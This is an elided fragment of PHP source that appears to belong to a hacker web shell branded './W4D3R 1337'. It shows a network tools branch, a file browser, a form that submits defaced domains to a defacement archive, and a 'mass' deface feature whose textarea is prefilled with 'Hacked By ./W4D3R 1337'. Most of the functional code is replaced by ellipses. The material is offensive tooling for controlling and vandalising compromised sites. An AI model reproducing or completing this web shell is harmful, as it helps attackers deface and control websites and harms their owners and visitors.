...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "network") {
		...
		elseif($args[0] === "bp") {
			...
			print color(1, 1, "./W4D3R 1337 '".$args[0]."'");
		}
	}
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://google.com/' target='_blank'>".color(1, 2, "./W4D3R 1337")."</a></center>";
}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='./W4D3R 1337'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./W4D3R 1337</textarea><br>
